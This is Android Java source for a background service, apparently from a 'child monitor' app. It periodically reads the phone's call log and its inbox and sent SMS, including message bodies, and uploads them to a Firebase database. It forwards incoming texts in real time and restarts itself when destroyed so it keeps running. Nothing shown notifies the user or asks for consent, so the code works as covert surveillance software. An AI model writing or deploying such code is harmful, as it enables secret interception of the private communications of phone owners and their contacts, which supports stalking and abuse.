package com.childmonitor.services;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.Telephony;

import androidx.annotation.Nullable;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class CallSmsService extends Service {

    private Handler handler;
    private Runnable runnable;
    private DatabaseReference ref;
    private long lastSync = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        String deviceId = getSharedPreferences("cm_prefs", MODE_PRIVATE)
                .getString("device_id", "unknown");
        ref = FirebaseDatabase.getInstance()
                .getReference("devices").child(deviceId).child("communications");
        handler = new Handler(Looper.getMainLooper());
        runnable = new Runnable() {
            @Override
            public void run() {
                syncCalls();
                syncSms();
                lastSync = System.currentTimeMillis();
                handler.postDelayed(this, 2 * 60 * 1000);
            }
        };
        handler.post(runnable);
    }

    private void syncCalls() {
        String sel = lastSync > 0 ? CallLog.Calls.DATE + ">" + lastSync : null;
        Cursor c = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                new String[]{CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME,
                        CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION},
                sel, null, CallLog.Calls.DATE + " DESC");
        if (c == null) return;
        while (c.moveToNext()) {
            String num = c.getString(0);
            String name = c.getString(1);
            int type = c.getInt(2);
            long date = c.getLong(3);
            int dur = c.getInt(4);
            String t = type == CallLog.Calls.INCOMING_TYPE ? "Incoming" :
                       type == CallLog.Calls.OUTGOING_TYPE ? "Outgoing" : "Missed";
            Map<String, Object> d = new HashMap<>();
            d.put("number", num);
            d.put("name", name != null ? name : "Unknown");
            d.put("type", t);
            d.put("duration", dur);
            d.put("timestamp", date);
            d.put("date_str", new SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(new Date(date)));
            ref.child("calls").child(String.valueOf(date)).setValue(d);
        }
        c.close();
    }

    private void syncSms() {
        String sel = lastSync > 0 ? "date>" + lastSync : null;
        syncFolder(Telephony.Sms.Inbox.CONTENT_URI, "inbox", sel);
        syncFolder(Telephony.Sms.Sent.CONTENT_URI, "sent", sel);
    }

    private void syncFolder(android.net.Uri uri, String folder, String sel) {
        Cursor c = getContentResolver().query(uri,
                new String[]{"address", "body", "date"}, sel, null, "date DESC");
        if (c == null) return;
        while (c.moveToNext()) {
            String num = c.getString(0);
            String body = c.getString(1);
            long date = c.getLong(2);
            if (body != null && body.length() > 300) body = body.substring(0, 300) + "...";
            Map<String, Object> d = new HashMap<>();
            d.put("number", num);
            d.put("message", body);
            d.put("folder", folder);
            d.put("timestamp", date);
            ref.child("sms").child(folder + "_" + date).setValue(d);
        }
        c.close();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("new_sms")) {
            Map<String, Object> d = new HashMap<>();
            d.put("number", intent.getStringExtra("sms_number"));
            d.put("message", intent.getStringExtra("sms_body"));
            d.put("folder", "inbox");
            d.put("timestamp", System.currentTimeMillis());
            ref.child("sms").child("rt_" + System.currentTimeMillis()).setValue(d);
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (handler != null) handler.removeCallbacks(runnable);
        startService(new Intent(this, CallSmsService.class));
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
